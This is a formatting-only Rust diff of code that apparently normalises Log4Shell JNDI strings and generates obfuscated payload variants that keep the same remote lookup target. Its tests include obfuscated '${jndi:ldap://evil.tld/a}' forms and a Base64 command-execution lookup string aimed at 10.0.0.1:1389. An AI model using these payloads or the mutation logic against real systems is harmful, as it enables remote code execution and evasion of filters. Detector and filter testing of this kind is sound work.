@@ -102,7 +102,9 @@ fn collapse_default_empty(s: &str) -> String {
             break;
         }
         let body_start = a + 5;
-        let Some(rel_end) = t[body_start..].find('}') else { break };
+        let Some(rel_end) = t[body_start..].find('}') else {
+            break;
+        };
         let arg = &t[body_start..body_start + rel_end];
         if arg.contains("${") {
             break;
@@ -123,7 +125,9 @@ fn collapse_default_named(s: &str, key: &str) -> String {
             break;
         }
         let body_start = a + pat.len();
-        let Some(rel_end) = t[body_start..].find('}') else { break };
+        let Some(rel_end) = t[body_start..].find('}') else {
+            break;
+        };
         let body = &t[body_start..body_start + rel_end];
         if body.contains("${") {
             break;
@@ -147,7 +151,9 @@ fn collapse_date(s: &str) -> String {
             break;
         }
         let body_start = a + 7;
-        let Some(rel_end) = t[body_start..].find('}') else { break };
+        let Some(rel_end) = t[body_start..].find('}') else {
+            break;
+        };
         let body = &t[body_start..body_start + rel_end];
         if body.contains("${") {
             break;
@@ -171,9 +177,13 @@ fn jndi_target(collapsed: &str) -> Option<(String, String)> {
 
 fn is_log4shell(s: &str) -> bool {
     let n = normalize(s);
-    n.contains("jndi:") && jndi_target(&n).is_some_and(|(sc, _)| {
-        matches!(sc.as_str(), "ldap" | "ldaps" | "rmi" | "dns" | "iiop" | "nis" | "corba")
-    })
+    n.contains("jndi:")
+        && jndi_target(&n).is_some_and(|(sc, _)| {
+            matches!(
+                sc.as_str(),
+                "ldap" | "ldaps" | "rmi" | "dns" | "iiop" | "nis" | "corba"
+            )
+        })
 }
 
 /// True iff `cand` still drives the SAME JNDI fetch (same protocol,
@@ -184,7 +194,10 @@ pub fn still_executes(original: &str, cand: &str) -> bool {
     if cand.trim().is_empty() || !is_log4shell(original) {
         return false;
     }
-    match (jndi_target(&normalize(original)), jndi_target(&normalize(cand))) {
+    match (
+        jndi_target(&normalize(original)),
+        jndi_target(&normalize(cand)),
+    ) {
         (Some(o), Some(c)) => o == c,
         _ => false,
     }
@@ -316,8 +329,15 @@ mod tests {
             "${${sys:x:-j}nd${::-i}:ldap://evil.tld/a}",
             "${${date:'j'}ndi:ldap://evil.tld/a}",
         ] {
-            assert!(still_executes("${jndi:ldap://evil.tld/a}", v), "not equiv: {v}");
-            assert_eq!(jndi_target(&normalize(v)).unwrap(), canon, "target drift: {v}");
+            assert!(
+                still_executes("${jndi:ldap://evil.tld/a}", v),
+                "not equiv: {v}"
+            );
+            assert_eq!(
+                jndi_target(&normalize(v)).unwrap(),
+                canon,
+                "target drift: {v}"
+            );
         }
     }
 
@@ -350,8 +370,14 @@ mod tests {
     #[test]
     fn deterministic_diverse_and_all_sound() {
         let atk = "${jndi:ldap://10.0.0.1:1389/Basic/Command/Base64/x}";
-        let a: Vec<_> = generate(atk, &cfg(7)).into_iter().map(|m| m.payload).collect();
-        let b: Vec<_> = generate(atk, &cfg(7)).into_iter().map(|m| m.payload).collect();
+        let a: Vec<_> = generate(atk, &cfg(7))
+            .into_iter()
+            .map(|m| m.payload)
+            .collect();
+        let b: Vec<_> = generate(atk, &cfg(7))
+            .into_iter()
+            .map(|m| m.payload)
+            .collect();
         assert_eq!(a, b);
         assert!(a.iter().collect::<std::collections::HashSet<_>>().len() >= 6);
         for seed in 0..30u64 {
